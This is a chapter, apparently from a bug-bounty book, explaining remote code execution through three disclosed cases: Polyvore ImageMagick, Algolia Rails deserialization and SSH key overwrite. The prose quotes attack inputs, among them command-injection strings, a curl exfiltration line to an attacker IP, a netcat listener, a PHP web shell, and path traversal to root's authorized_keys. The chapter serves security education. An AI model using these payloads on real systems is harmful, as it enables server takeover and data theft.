- en: '**12'
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: REMOTE CODE EXECUTION**
  prefs: []
  type: TYPE_NORMAL
- en: '![Image](../images/common.jpg)'
  prefs: []
  type: TYPE_IMG
- en: A *remote code execution (RCE)* vulnerability occurs when an application uses
    user-controlled input without sanitizing it. RCE is typically exploited in one
    of two ways. The first is by executing shell commands. The second is by executing
    functions in the programming language that the vulnerable application uses or
    relies on.
  prefs: []
  type: TYPE_NORMAL
- en: '**Executing Shell Commands**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'You can perform RCE by executing shell commands that the application doesn’t
    sanitize. A *shell* gives command line access to an operating system’s services.
    As an example, let’s pretend the site *www.<example>.com* is designed to ping
    a remote server to confirm whether the server is available. Users can trigger
    this by providing a domain name to the `domain` parameter in `www.`example`.com?domain=`,
    which the site’s PHP code processes as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: Visiting *www.<example>.com?domain=google.com* assigns the value `google.com`
    to the variable `$domain` at ➊ and then passes that variable directly into the
    `shell_exec` function as an argument for the `ping` command at ➋. The `shell_exec`
    function executes a shell command and returns the complete output as a string.
  prefs: []
  type: TYPE_NORMAL
- en: 'The output of this command is something like the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'The details of the response aren’t important: just know that the `$domain`
    variable is passed directly to the `shell_exec` command without being sanitized.
    In bash, which is a popular shell, you can chain commands together using a semicolon.
    So an attacker could visit the URL *www.<example>.com?domain=google.com;id*, and
    the `shell_exec` function would execute the `ping` and `id` commands. The `id`
    command outputs information about the current user executing the command on the
    server. For example, the output might look like the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: The server executes two commands, so the response from the `ping` command displays
    ➊ along with the output from the `id` command. The `id` command’s output ➋ indicates
    the website is running the application on the server as the user named `yaworsk`
    with a `uid` of `1000` that belongs to the `gid` and group `1000` with the same
    name, `yaworsk`.
  prefs: []
  type: TYPE_NORMAL
- en: The user permissions of `yaworsk` determine how severe this RCE vulnerability
    is. In this example, an attacker could read the site’s code using the command
    `;cat` FILENAME (where FILENAME is the file to be read) and might write files
    to some directories. If the site uses a database, it’s likely an attacker could
    dump that as well.
  prefs: []
  type: TYPE_NORMAL
- en: 'This type of RCE occurs if a site trusts user-controlled input without sanitizing
    it. The solution to addressing the vulnerability is simple. In PHP, a website’s
    developer can use the `escapeshellcmd`, which escapes any characters in a string
    that might trick a shell into executing arbitrary commands. As a result, any appended
    commands in the URL parameter would be read as one escaped value. This means that
    `google.com\;id` would have been passed to the `ping` command, resulting in the
    error `ping: google.com;id: Name or service not known`.'
  prefs: []
  type: TYPE_NORMAL
- en: Although the special characters would be escaped to avoid executing additional,
    arbitrary commands, keep in mind that `escapeshellcmd` would not prevent you from
    passing command line flags. A *flag* is an optional argument that changes a command’s
    behavior. For example, `-0` is a common flag used to define a file to write to
    when a command generates output. Passing a flag could change the behavior of the
    command and possibly result in an RCE vulnerability. Preventing RCE vulnerabilities
    can be tricky because of these nuances.
  prefs: []
  type: TYPE_NORMAL
- en: '**Executing Functions**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'You can also perform RCE by executing functions. For example, if *www.<example>.com*
    allowed users to create, view, and edit blog posts via a URL, like *www.<example>.com?id=1&action=view*,
    the code that performed these actions might look like the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: Here the website uses the PHP function `call_user_func` ➋, which calls the first
    argument given as a function and passes the remaining parameters as arguments
    to that function. In this case, the application would call the `view` function
    that is assigned to the `action` variable ➊ and pass `1` to the function. This
    command would presumably show the first blog post.
  prefs: []
  type: TYPE_NORMAL
- en: 'But if a malicious user visits the URL *www.<example>.com?id=/etc/passwd &action=file_get_contents*,
    this code would evaluate as:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'Passing `file_get_contents` as the action argument calls that PHP function
    to read the contents of a file into a string. In this case, the file */etc/passwd*
    is passed as the `id` parameter. Then */etc/passwd* is passed as the argument
    to `file_get_contents`, resulting in the file being read. An attacker could use
    this vulnerability to read the source code of the entire application, obtain database
    credentials, write files on the server, and so on. Instead of showing the first
    blog post, the output would look like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: If the functions passed to the `action` parameter are not sanitized or filtered,
    it’s also possible for an attacker to invoke shell commands with PHP functions,
    such as `shell_exec`, `exec`, `system`, and so on.
  prefs: []
  type: TYPE_NORMAL
- en: '**Strategies for Escalating Remote Code Execution**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Both types of RCE can cause a variety of effects. When an attacker can execute
    any programming language function, it’s likely they might escalate the vulnerability
    to execute shell commands. Executing shell commands is often more critical because
    an attacker could compromise the entire server rather than just the application.
    The extent of the vulnerability depends on the server user’s permissions or whether
    the attacker can exploit another bug to elevate the user’s privileges, which is
    commonly referred to as *local privilege escalation (LPE)*.
  prefs: []
  type: TYPE_NORMAL
- en: Although a full explanation of LPEs is beyond the scope of this book, just know
    that an LPE typically occurs by exploiting kernel vulnerabilities, services running
    as root, or *set user ID (SUID)* executables. A *kernel* is the computer’s operating
    system. Exploiting a kernel vulnerability could allow an attacker to elevate their
    permissions to perform actions they otherwise wouldn’t be authorized to do. In
    cases where the attacker can’t exploit the kernel, they could try exploiting services
    running as root. Normally, services shouldn’t run as root; this vulnerability
    often occurs when an administrator ignores security considerations by starting
    a service as the root user. If the administrator is compromised, the attacker
    could access the service running as root, and any commands the service runs would
    have elevated root permissions. Lastly, the attacker could exploit SUID, which
    allows users to execute a file with the permissions of a specified user. Although
    this is meant to enhance security, when misconfigured, it could allow attackers
    to execute commands with elevated privileges, similar to services running as root.
  prefs: []
  type: TYPE_NORMAL
- en: Given the variety of operating systems, server software, programming languages,
    frameworks, and so on used to host websites, it’s impossible to detail every way
    you could inject functions or shell commands. But there are patterns to finding
    clues to where potential RCEs might exist without seeing the application code.
    In the first example, one red flag was that the site executed the `ping` command,
    which is a system-level command.
  prefs: []
  type: TYPE_NORMAL
- en: In the second example, the `action` parameter is a red flag because it allowed
    you to control what function is run on the server. When you’re looking for these
    types of clues, look at the parameters and values passed to the site. You can
    easily test this type of behavior by passing system actions or special command
    line characters, like semicolons or backticks, to the parameters in place of expected
    values.
  prefs: []
  type: TYPE_NORMAL
- en: 'Another common cause of an application-level RCE is unrestricted file uploads
    that the server executes when visited. For example, if a PHP website allows you
    to upload files to a workspace but doesn’t restrict the file type, you could upload
    a PHP file and visit it. Because a vulnerable server can’t differentiate between
    legitimate PHP files for the application and your malicious upload, the file will
    be interpreted as PHP and its contents will be executed. Here’s an example of
    a file that allows you to execute PHP functions defined by the URL parameter `super_secret_web_param`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: If you uploaded this file to *www.<example>.com* and accessed it at *www.<example>.com/files/shell.php*,
    you could execute system commands by adding the parameter with a function, such
    as `?super_secret_web_param='ls'`. Doing so would output the contents of the *files*
    directory. Be extremely careful when you’re testing this type of vulnerability.
    Not all bounty programs want you to execute your own code on their server. If
    you do upload a shell like this, be sure to delete it so no one else finds it
    or exploits it maliciously.
  prefs: []
  type: TYPE_NORMAL
- en: More complex RCE examples are often the result of nuanced application behavior
    or programming mistakes. In fact, such examples were discussed in [Chapter 8](ch08.xhtml#ch08).
    Orange Tsai’s Uber Flask Jinja2 template injection ([page 74](ch08.xhtml#page_74))
    was an RCE that permitted him to execute his own Python functions using the Flask
    templating language. My Unikrn Smarty template injection ([page 78](ch08.xhtml#page_78))
    allowed me to exploit the Smarty framework to execute PHP functions, including
    `file_get_contents`. Given the variety of RCEs, here we’ll focus on more traditional
    examples than those you’ve seen in previous chapters.
  prefs: []
  type: TYPE_NORMAL
- en: '**Polyvore ImageMagick**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '**Difficulty:** Medium'
  prefs: []
  type: TYPE_NORMAL
- en: '**URL:** *[Polyvore.com](http://Polyvore.com)* (Yahoo! acquisition)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Source:** *[http://nahamsec.com/exploiting-imagemagick-on-yahoo/](http://nahamsec.com/exploiting-imagemagick-on-yahoo/)*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Date reported:** May 5, 2016'
  prefs: []
  type: TYPE_NORMAL
- en: '**Bounty paid:** $2,000'
  prefs: []
  type: TYPE_NORMAL
- en: Looking at vulnerabilities that have been disclosed in widely used software
    libraries can be an effective way to discover bugs in sites using that software.
    ImageMagick is a common graphics library that processes images and has an implementation
    in most, if not all, major programming languages. This means that an RCE in the
    ImageMagick library can have devastating effects on websites that rely on it.
  prefs: []
  type: TYPE_NORMAL
- en: 'In April 2016, the maintainers of ImageMagick publicly disclosed library updates
    to fix critical vulnerabilities. The updates revealed that ImageMagick wasn’t
    properly sanitizing input in a variety of ways. The most dangerous of these led
    to an RCE via ImageMagick’s `delegate` functionality, which processes files using
    external libraries. The following code does this by passing a user-controlled
    domain to the `system()` command as the placeholder %M:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'This value was not sanitized before it was used, so submitting `https://`example`.com";|ls
    "-la` would translate to this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: As in the earlier RCE example, which involved chaining extra commands to `ping`,
    this code chains an extra command line function to the intended functionality
    using a semicolon.
  prefs: []
  type: TYPE_NORMAL
- en: The `delegate` functionality can be abused by image file types that allow external
    file referencing. Examples include SVGs and the ImageMagick-defined file type,
    MVG. When ImageMagick processes an image, it tries to guess a file’s type based
    on its file contents rather than its extension. For example, if a developer tried
    to sanitize user-submitted images by allowing their application to accept only
    user files ending in *.jpg*, an attacker could bypass the sanitization by renaming
    a *.mvg* file as a *.jpg*. The application would believe the file is a safe *.jpg*,
    but ImageMagick would properly recognize the file type was an MVG based on the
    file content. This would allow the attacker to abuse the ImageMagick RCE vulnerability.
    Examples of malicious files used to abuse this ImageMagick vulnerability are available
    at *[https://imagetragick.com/](https://imagetragick.com/)*.
  prefs: []
  type: TYPE_NORMAL
- en: 'After this vulnerability was publicly disclosed and websites had an opportunity
    to update their code, Ben Sadeghipour went hunting for sites using unpatched versions
    of ImageMagick. As his first step, Sadeghipour re-created the vulnerability on
    his own server to confirm he had a working malicious file. He chose to use the
    example MVG file from *[https://imagetragick.com/](https://imagetragick.com/)*,
    but could have easily used the SVG file as well, since both reference external
    files which will trigger the vulnerable ImageMagick `delegate` functionality.
    Here’s his code:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: The important part of this file is the line at ➊, which includes the malicious
    input. Let’s break it down. The first part of the exploit is *https://127.0.0.1/x.php?x=*.
    This is the remote URL ImageMagick is expecting as part of its delegator behavior.
    Sadeghipour follows this with `` `id ``. On the command line, backticks (`` `
    ``) denote input that the shell should process before the main command. This ensures
    that Sadeghipour’s payload (described next) is processed immediately.
  prefs: []
  type: TYPE_NORMAL
- en: The pipe (`|`) passes output from one command to the next. In this case, the
    output of `id` is passed to `curl http://`SOMEIPADDRESS`:8080/ -d @-`. The cURL
    library makes remote HTTP requests and, in this case, makes a request to Sadeghipour’s
    IP address, which is listening on port 8080\. The `-d` flag is a cURL option to
    send data as a `POST` request. The `@` instructs cURL to use the input exactly
    as it receives it with no other processing. The hyphen (`–`) denotes that standard
    input will be used. When all of this syntax is combined with the pipe (`|`), the
    output of the `id` command will be passed to cURL as the `POST` body without any
    processing. Finally, the `> /dev/null` code drops any output from the command
    so that nothing is printed to the vulnerable server terminal. This helps keep
    the target from realizing that their security has been compromised.
  prefs: []
  type: TYPE_NORMAL
- en: Before uploading the file, Sadeghipour started a server to listen for HTTP requests
    using Netcat, a common networking utility for reading and writing to connections.
    He ran the command `nc -l -n -vv -p 8080`, which allowed Sadeghipour to log `POST`
    requests to his server. The `-l` flag enables listen mode (to receive requests),
    `-n` prevents DNS lookups, `-vv` enables verbose logging, and `-p 8080` defines
    the port used.
  prefs: []
  type: TYPE_NORMAL
- en: Sadeghipour tested his payload on the Yahoo! site Polyvore. After uploading
    his file on the site as an image, Sadeghipour received the following `POST` request,
    which included the result of the `id` command executed on Polyvore servers in
    the body.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: This request meant that Sadeghipour’s MVG file was successfully executed, causing
    the vulnerable website to execute the `id` command.
  prefs: []
  type: TYPE_NORMAL
- en: '***Takeaways***'
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: There are two significant takeaways from Sadeghipour’s bug. First, being aware
    of disclosed vulnerabilities provides you with the opportunity to test new code,
    as mentioned in previous chapters. If you’re testing large libraries, also ensure
    that the companies of the websites you’re testing are properly managing their
    security updates. Some programs will ask you not to report unpatched updates within
    a given time frame of the disclosure, but after that you’re free to report the
    vulnerability. Second, reproducing vulnerabilities on your own servers is a great
    learning opportunity. It ensures that your payloads are functional when you attempt
    to implement them for a bug bounty.
  prefs: []
  type: TYPE_NORMAL
- en: '**Algolia RCE on [facebooksearch.algolia.com](http://facebooksearch.algolia.com)**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '**Difficulty:** High'
  prefs: []
  type: TYPE_NORMAL
- en: '**URL:** *[facebooksearch.algolia.com](http://facebooksearch.algolia.com)*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Source:** *[https://hackerone.com/reports/134321/](https://hackerone.com/reports/134321/)*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Date reported:** April 25, 2016'
  prefs: []
  type: TYPE_NORMAL
- en: '**Bounty paid:** $500'
  prefs: []
  type: TYPE_NORMAL
- en: Proper reconnaissance is an important part of hacking. On April 25, 2016, Michiel
    Prins (a HackerOne co-founder) was doing recon on *[algolia.com](http://algolia.com)*
    using the tool Gitrob. This tool takes an initial GitHub repository, person, or
    organization as a seed and spiders all repositories it can find from people connected
    to it. Within all the repositories it finds, it will look for sensitive files
    based on keywords, such as *password, secret, database,* and so on.
  prefs: []
  type: TYPE_NORMAL
- en: Using Gitrob, Prins noticed that Algolia had publicly committed a Ruby on Rails
    `secret_key_base` value to a public repository. The `secret_key_base` helps Rails
    prevent attackers from manipulating signed cookies, and it’s meant to be concealed
    and never shared. Typically, this value is replaced by the environment variable
    `ENV['SECRET_KEY_BASE']`, which only the server can read. Using the `secret_key_base`
    is especially important when a Rails site uses a cookiestore to store session
    information in the cookies (we’ll come back to this). Because Algolia committed
    the value to a public repository, the `secret_key_base` value is still visible
    at *[https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/](https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/)*
    but is no longer valid.
  prefs: []
  type: TYPE_NORMAL
- en: 'When Rails signs a cookie, it appends a signature to the cookie’s base64-encoded
    value. For example, a cookie and its signature might look like this: `BAh7B0kiD3Nlc3Npb25faWQGOdxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b8`.
    Rails checks the signature after the double dashes to ensure the beginning of
    the cookie hasn’t been altered. This is significant when Rails is using the cookiestore,
    because Rails manages website sessions using cookies and their signatures by default.
    Information about a user can be added to the cookie and read by the server when
    the cookie is submitted via an HTTP request. Because the cookie is saved on a
    person’s computer, Rails signs the cookie with the secret to ensure it hasn’t
    been tampered with. How the cookie is read is also important; the Rails cookiestore
    serializes and deserializes the information stored in the cookie.'
  prefs: []
  type: TYPE_NORMAL
- en: In computer science, *serialization* is the process of converting an object
    or data into a state that allows it to be transferred and reconstructed. In this
    case, Rails converts the session information into a format that can be stored
    in a cookie and reread when a user submits the cookie during their next HTTP request.
    After serialization, the cookie is read through deserialization. The deserialization
    process is complex and beyond the scope of this book. But it can often lead to
    RCEs it is passed untrusted data.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*To learn more about deserialization, see these two great resources: Matthias
    Kaiser’s “Exploiting Deserialization Vulnerabilities in Java” talk at* [https://www.youtube.com/watch?v=VviY3O-euVQ/](https://www.youtube.com/watch?v=VviY3O-euVQ/)
    *and Alvaro Muñoz and Alexandr Mirosh’s “Friday the 13th JSON attacks” talk at*
    [https://www.youtube.com/watch?v=ZBfBYoK_Wr0/](https://www.youtube.com/watch?v=ZBfBYoK_Wr0/)).'
  prefs: []
  type: TYPE_NORMAL
- en: Knowing the Rails secret meant Prins could create his own valid serialized objects
    and send them to the site to be deserialized via a cookie. If vulnerable, deserialization
    would lead to an RCE.
  prefs: []
  type: TYPE_NORMAL
- en: Prins used a Metasploit Framework exploit called Rails Secret Deserialization
    to escalate this vulnerability into an RCE. The Metasploit exploit creates a cookie
    that invokes a reverse shell if it’s successfully deserialized. Prins sent the
    malicious cookie to Algolia, which enabled a shell on the vulnerable server. As
    a proof of concept, he ran the command `id`, which returned `uid=1000(prod) gid=1000(prod)
    groups=1000(prod)`. He also created the file *hackerone.txt* on the server to
    demonstrate the vulnerability.
  prefs: []
  type: TYPE_NORMAL
- en: '***Takeaways***'
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: In this case, Prins used an automated tool to scrape public repositories for
    sensitive values. By doing the same, you can also discover any repositories using
    suspicious keywords that might clue you in to vulnerabilities. Exploiting deserialization
    vulnerabilities can be very complex, but some automated tools exist to make this
    easier. For example, you can use Rapid7’s Rails Secret Deserialization for earlier
    versions of Rails and ysoserial, which is maintained by Chris Frohoff, for Java
    deserialization vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: '**RCE Through SSH**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '**Difficulty:** High'
  prefs: []
  type: TYPE_NORMAL
- en: '**URL:** N/A'
  prefs: []
  type: TYPE_NORMAL
- en: '**Source:** *[blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/](http://blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/)*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Date reported:** Fall 2017'
  prefs: []
  type: TYPE_NORMAL
- en: '**Bounty paid:** Undisclosed'
  prefs: []
  type: TYPE_NORMAL
- en: When a target program gives you a large scope to test, it’s best to automate
    the discovery of assets, then look for subtle indicators that a site might contain
    vulnerabilities. This is exactly what Jasmin Landry did in the fall of 2017\.
    He began enumerating subdomains and open ports on a website by using the tools
    Sublist3r, Aquatone, and Nmap. Because he had discovered hundreds of possible
    domains and it was impossible to visit them all, he used the automated tool EyeWitness
    to take screenshots of each one. This helped him visually identify interesting
    websites.
  prefs: []
  type: TYPE_NORMAL
- en: 'EyeWitness disclosed a content management system that Landry found unfamiliar,
    looked old, and was open source. Landry guessed the default credentials for the
    software would be `admin:admin`. Testing them worked, so he kept digging. The
    site didn’t have any content, but auditing the open source code revealed the application
    ran as the root user on a server. This is bad practice: the root user can perform
    any action on a site, and if the application is compromised, an attacker would
    have full permissions on the server. This was another reason for Landry to keep
    digging.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, Landry looked for *disclosed security issues*, or *CVEs*. The site had
    none, which was unusual for old, open source software. Landry identified a number
    of less severe issues including XSS, CSRF, XXEs, and a *local file disclosure*
    (the ability to read arbitrary files on a server). All of these bugs meant it
    was likely that an RCE could exist somewhere.
  prefs: []
  type: TYPE_NORMAL
- en: Continuing his work, Landry noticed an API endpoint that allowed users to update
    template files. The path was */api/i/services/site/write-configuration.json?path=/config/sites/test/page/test/config.xml*,
    and it accepted XML via a `POST` body. The ability to write files and the ability
    to define their path are two significant red flags. If Landry could write files
    anywhere and have the server interpret them as application files, he could execute
    whatever code he wanted on the server and possibly invoke system calls. To test
    this, he changed the path to *../../../../../../../../../../../../tmp/test.txt*.
    The symbols *../* are references to the previous directory in the current path.
    So if the path was */api/i/services*, *../* would be */api/i*. This allowed Landry
    to write in any folder he wanted.
  prefs: []
  type: TYPE_NORMAL
- en: 'Uploading his own file worked, but the application configuration didn’t allow
    him to execute code, so he needed to find an alternative route to an RCE. It occurred
    to him that a *Secure Socket Shell (SSH)* can use public SSH keys to authenticate
    users. SSH access is the typical way to administer a remote server: it logs into
    the command line via the secure connection established by validating public keys
    on the remote host in the *.ssh/authorized_keys* directory. If he was able to
    write to the directory and upload his own SSH public key, the site would authenticate
    him as the root user with direct SSH access and full permissions on the server.'
  prefs: []
  type: TYPE_NORMAL
- en: He tested this and was able to write to *../../../../../../../../../../../../root/.ssh/authorized_keys*.
    Attempting to use SSH to get into the server worked and running the `id` command
    confirmed he was root `uid=0(root) gid=0(root) groups=0(root)`.
  prefs: []
  type: TYPE_NORMAL
- en: '***Takeaways***'
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: Enumerating subdomains when you’re searching for bugs in a large scope is important
    because it gives you more surface area to test. Landry was able to use automated
    tools to discover a suspicious target, and confirming a few initial vulnerabilities
    indicated there could be more to find. Most notably, when his initial attempt
    at a file upload RCE failed, Landry reconsidered his approach. He recognized that
    he could exploit the SSH configuration rather than just report the arbitrary file
    writing vulnerability by itself. Submitting a comprehensive report that fully
    demonstrates impact usually increases the bounty amount you’re awarded. So don’t
    stop immediately once you’ve found something—keep digging.
  prefs: []
  type: TYPE_NORMAL
- en: '**Summary**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: RCE, like a lot of other vulnerabilities discussed in this book, usually occurs
    when user input isn’t properly sanitized before use. In the first bug report,
    ImageMagick wasn’t properly escaping content before passing it to system commands.
    To find this bug, Sadeghipour first re-created the vulnerability on his own server
    and then went searching for unpatched servers. In contrast, Prins discovered a
    secret that allowed him to forge signed cookies. Lastly, Landry found a way to
    write arbitrary files on a server and used that to overwrite SSH keys so he could
    log in as root. All three used different methods to obtain RCE, but each took
    advantage of the site accepting unsanitized input.
  prefs: []
  type: TYPE_NORMAL
